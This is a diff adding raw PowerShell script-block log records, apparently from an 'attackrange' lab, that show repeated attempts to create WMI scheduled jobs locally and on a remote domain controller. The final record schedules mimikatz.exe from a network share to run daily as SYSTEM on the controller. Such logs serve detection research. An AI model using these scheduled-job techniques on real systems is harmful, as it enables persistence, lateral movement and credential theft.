@@ -1,0 +1,195 @@
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T21:17:35.803050800Z'/><EventRecordID>764404</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0003-17E6-725A965DD901}'/><Execution ProcessID='1940' ThreadID='3380'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$newTask = ([wmiclass]"\\$computerName\root\cimv2:Win32_ScheduledJob").CreateInstance()
+$newTask.Command = "notepad.exe"
+$newTask.StartTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).AddMinutes(1))
+$newTask.Put()
+
+# Get the list of scheduled tasks using WMI
+$scheduledTasks = Get-WmiObject -Class Win32_ScheduledJob -Namespace "root\CIMV2"
+
+# Select a random task to modify
+$randomTask = Get-Random -InputObject $scheduledTasks
+
+# Set the path to Notepad.exe
+$notepadPath = "C:\Windows\System32\notepad.exe"
+
+# Generate a random time to run the task
+$randomTime = Get-Date -Hour (Get-Random -Minimum 0 -Maximum 23) -Minute (Get-Random -Minimum 0 -Maximum 59)
+
+# Modify the selected task to run Notepad.exe at the random time
+if ($randomTask -ne $null) {
+    $randomTask.Command = "$notepadPath"
+    $randomTask.StartTime = $randomTime
+    $randomTask.Put()
+}
+else {
+    Write-Host "No tasks found to modify."
+}
+</Data><Data Name='ScriptBlockId'>aa0922db-be31-42a5-9299-22845027e9bf</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T21:17:19.236262800Z'/><EventRecordID>764375</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0000-0F0A-755A965DD901}'/><Execution ProcessID='1940' ThreadID='3380'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Get the list of scheduled tasks using WMI
+$scheduledTasks = Get-WmiObject -Class Win32_ScheduledJob -Namespace "root\CIMV2"
+
+# Select a random task to modify
+$randomTask = Get-Random -InputObject $scheduledTasks
+
+# Set the path to Notepad.exe
+$notepadPath = "C:\Windows\System32\notepad.exe"
+
+# Generate a random time to run the task
+$randomTime = Get-Date -Hour (Get-Random -Minimum 0 -Maximum 23) -Minute (Get-Random -Minimum 0 -Maximum 59)
+
+# Modify the selected task to run Notepad.exe at the random time
+if ($randomTask -ne $null -and $randomTask.Command -ne $null -and $randomTask.StartTime -ne $null) {
+    $randomTask.Command = "$notepadPath"
+    $randomTask.StartTime = $randomTime
+    $randomTask.Put()
+}
+else {
+    Write-Host "No valid tasks found to modify."
+}
+</Data><Data Name='ScriptBlockId'>e6169232-4ffc-4318-aed4-0c6e1d6d8654</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T21:17:03.118465700Z'/><EventRecordID>764318</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0000-DD09-755A965DD901}'/><Execution ProcessID='1940' ThreadID='3380'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$newTask = ([wmiclass]"\\$computerName\root\cimv2:Win32_ScheduledJob").CreateInstance()
+$newTask.Command = "notepad.exe"
+$newTask.StartTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).AddMinutes(1))
+$newTask.Put()
+
+# Get the list of scheduled tasks using WMI
+$scheduledTasks = Get-WmiObject -Class Win32_ScheduledJob -Namespace "root\CIMV2"
+
+# Select a random task to modify
+$randomTask = Get-Random -InputObject $scheduledTasks
+
+# Set the path to Notepad.exe
+$notepadPath = "C:\Windows\System32\notepad.exe"
+
+# Generate a random time to run the task
+$randomTime = Get-Date -Hour (Get-Random -Minimum 0 -Maximum 23) -Minute (Get-Random -Minimum 0 -Maximum 59)
+
+# Modify the selected task to run Notepad.exe at the random time
+if ($randomTask -ne $null) {
+    $randomTask.Command = "$notepadPath"
+    $randomTask.StartTime = $randomTime
+    $randomTask.Put()
+}
+else {
+    Write-Host "No tasks found to modify."
+}
+</Data><Data Name='ScriptBlockId'>c9cbf4ce-cd0b-4ced-998a-d5c2b76b55e4</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T21:16:30.101699900Z'/><EventRecordID>764247</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0002-E6A8-745A965DD901}'/><Execution ProcessID='1940' ThreadID='3380'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Create a new scheduled task to run Notepad.exe
+$newTask = ([wmiclass]'\\.\root\cimv2:Win32_ScheduledJob').CreateInstance()
+$newTask.Command = "C:\Windows\System32\notepad.exe"
+$newTask.StartTime = [System.Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).AddMinutes(1))
+$newTask.Put()
+
+# Get the list of scheduled tasks using WMI
+$scheduledTasks = Get-WmiObject -Class Win32_ScheduledJob -Namespace "root\CIMV2"
+
+# Select the newly created task
+$randomTask = $scheduledTasks | Where-Object { $_.Command -eq "C:\Windows\System32\notepad.exe" }
+
+# Generate a random time to run the task
+$notepadPath = "C:\Windows\System32\notepad.exe"
+$randomTime = Get-Date -Hour (Get-Random -Minimum 0 -Maximum 23) -Minute (Get-Random -Minimum 0 -Maximum 59)
+
+# Modify the selected task to run Notepad.exe at the random time
+$randomTask.Command = "$notepadPath"
+$randomTask.StartTime = $randomTime
+$randomTask.Put()
+</Data><Data Name='ScriptBlockId'>709e0eb4-e81d-4442-b210-d2cfa68afbd9</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T21:07:46.951533100Z'/><EventRecordID>764221</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0000-6B06-755A965DD901}'/><Execution ProcessID='1940' ThreadID='3380'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Get-WmiObject -Class Win32_ScheduledJob -Namespace "root\CIMV2"</Data><Data Name='ScriptBlockId'>2420f210-cda8-4ac2-939d-53fe2605d75d</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T21:07:33.169129400Z'/><EventRecordID>764150</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0000-5306-755A965DD901}'/><Execution ProcessID='1940' ThreadID='3380'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Get the list of scheduled tasks using WMI
+$scheduledTasks = Get-WmiObject -Class Win32_ScheduledJob -Namespace "root\CIMV2"
+
+# Select a random task to modify
+$randomTask = Get-Random -InputObject $scheduledTasks
+
+# Set the path to Notepad.exe
+$notepadPath = "C:\Windows\System32\notepad.exe"
+
+# Generate a random time to run the task
+$randomTime = Get-Date -Hour (Get-Random -Minimum 0 -Maximum 23) -Minute (Get-Random -Minimum 0 -Maximum 59)
+
+# Modify the selected task to run Notepad.exe at the random time
+$randomTask.Command = "$notepadPath"
+$randomTask.StartTime = $randomTime
+$randomTask.Put()
+</Data><Data Name='ScriptBlockId'>ec468edb-6c83-436c-811d-b533c193c0c4</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:53:06.232728400Z'/><EventRecordID>763986</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0001-6AA2-725A965DD901}'/><Execution ProcessID='5580' ThreadID='1752'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Get-WmiObject -Class Win32_ScheduledJob -ComputerName "mswin-dc01.attackrange.local" -Credential "attackrange.local\administrator" -Impersonation 3 -Authentication 6 -EnableAllPrivileges | ForEach-Object { $_.Create("Notepad.exe", "********130000.000000-420", $null, 1, $null, $null) }</Data><Data Name='ScriptBlockId'>9c991ba5-7012-48c8-911b-628941286752</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:19:23.350204400Z'/><EventRecordID>763625</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0001-C994-725A965DD901}'/><Execution ProcessID='5580' ThreadID='1752'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Get-WmiObject -Class Win32_ScheduledJob -ComputerName "mswin-dc01.attackrange.local" -Credential "attackrange.local\administrator" -Impersonation 3 -Authentication 6 -EnableAllPrivileges | ForEach-Object { $_.Create("Notepad.exe", "********130000.000000-420", $null, 1, $null, $null) }</Data><Data Name='ScriptBlockId'>d84f01e0-ee62-4e4f-99a4-8be4d0b4a466</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:13:52.629546600Z'/><EventRecordID>763599</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0001-C392-725A965DD901}'/><Execution ProcessID='5580' ThreadID='1752'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>([wmiclass]'Win32_ScheduledJob').Create("Notepad.exe", "********130000.000000-420", $null, 1, $null, $null)
+</Data><Data Name='ScriptBlockId'>7f3f6b93-cfde-428a-865d-7a04f671fff1</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:13:14.028793300Z'/><EventRecordID>763569</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0002-3787-745A965DD901}'/><Execution ProcessID='5580' ThreadID='1752'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>([wmiclass]'Win32_ScheduledJob').Create("Notepad.exe", "********130000.000000-420", $false, 0, $null, $null, "NotepadJob")
+</Data><Data Name='ScriptBlockId'>4914f930-aede-425e-be0c-c5df01bd7320</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:13:10.312902300Z'/><EventRecordID>763543</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0001-8192-725A965DD901}'/><Execution ProcessID='6884' ThreadID='6964'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>([wmiclass]'Win32_ScheduledJob').Create("Notepad.exe", "********130000.000000-420", $false, 0, $null, $null, "NotepadJob")
+</Data><Data Name='ScriptBlockId'>3ea19a68-5b3b-42a2-818a-1b09e45eb0e3</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:13:01.488877900Z'/><EventRecordID>763518</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0002-FF86-745A965DD901}'/><Execution ProcessID='3168' ThreadID='1152'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>([wmiclass]'Win32_ScheduledJob').Create("Notepad.exe", "********130000.000000-420", $false, 0, $null, $null, "NotepadJob")
+</Data><Data Name='ScriptBlockId'>a8d8d5db-4297-457e-804a-488dfe2eb649</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:01:29.253494200Z'/><EventRecordID>763437</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0002-E582-745A965DD901}'/><Execution ProcessID='3168' ThreadID='1152'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$computerName = "mswin-dc01.attackrange.local"
+$taskName = "MyTask"
+$executablePath = "C:\Windows\System32\calc.exe"
+
+# Generate a unique job ID
+$jobId = (Get-Random -Minimum 1000 -Maximum 9999)
+
+# Connect to the remote endpoint using WMI
+$wmi = Get-WmiObject -Class Win32_ScheduledJob -ComputerName $computerName
+
+# Create the scheduled job
+$job = $wmi.CreateInstance()
+$job.JobId = $jobId
+$job.Command = $executablePath
+$job.StartDay = 0
+$job.StartHour = 0
+$job.StartMinute = 0
+$job.Name = $taskName
+
+# Save the scheduled job
+$job.Put()
+</Data><Data Name='ScriptBlockId'>d212c650-22c1-4b0a-9c32-413e1fc11297</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T20:00:27.012577400Z'/><EventRecordID>763369</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0002-7582-745A965DD901}'/><Execution ProcessID='3168' ThreadID='1152'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$computerName = "mswin-dc01.attackrange.local"
+$taskName = "MyAtomicTask"
+$executablePath = "C:\Windows\System32\calc.exe"
+$startTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).AddMinutes(1))
+
+$remoteComputer = "\\$computerName"
+$job = ([WMIClass]"$remoteComputer\root\cimv2:Win32_ScheduledJob").CreateInstance()
+
+$job.JobId = "ScheduledTask"
+$job.Command = "$executablePath"
+$job.StartTime = $startTime
+$job.RunRepeatedly = $false
+$job.Interactive = $true
+$job.RunOnlyIfLoggedOn = $false
+
+$job.Put()
+</Data><Data Name='ScriptBlockId'>9f02a7b9-d6d1-4f16-af19-7812a5e29c49</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-27T19:58:40.277708300Z'/><EventRecordID>763173</EventRecordID><Correlation ActivityID='{5A6C058E-5D96-0000-21E2-745A965DD901}'/><Execution ProcessID='3168' ThreadID='1152'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Remote computer name or IP address
+$remote_computer = 'mswin-dc01.attackrange.local'
+
+# Scheduled task settings
+$task_name = 'MyAtomicWMITask'
+$task_command = 'powershell.exe -File "\\10.0.1.17\c$\temp\mimikatz.exe"'
+$trigger_frequency = 'DAILY'
+$trigger_time = '10:00:00 PM'
+
+# Connect to remote computer using WMI
+$wmi = Get-WmiObject -Class Win32_ScheduledJob -Namespace "root\CIMV2" -ComputerName $remote_computer
+
+# Set up scheduled task properties
+$job = $wmi.CreateInstance()
+$job.JobId = $null
+$job.Command = $task_command
+$job.Owner = "NT AUTHORITY\SYSTEM"
+$job.Priority = 3
+$job.StartTime = (Get-Date $trigger_time).ToUniversalTime()
+$job.Interval = 86400 # Number of seconds in a day
+$job.DayOfMonth = 0
+$job.DaysOfWeek = 62 # Daily task
+$job.RunRepetitions = 0
+$job.UntilTime = 0
+
+# Submit scheduled task to remote computer
+$job.Put()
+
+# Schedule task using WMI
+$result = Invoke-WmiMethod -Class Win32_ScheduledJob -Name Create -ArgumentList $task_command, $trigger_frequency, $false, $null, $null, $true, 0, $trigger_time, $null, $null, $null -ComputerName $remote_computer
+</Data><Data Name='ScriptBlockId'>cb88e3e6-f36d-406e-993d-884e362e84da</Data><Data Name='Path'></Data></EventData></Event>
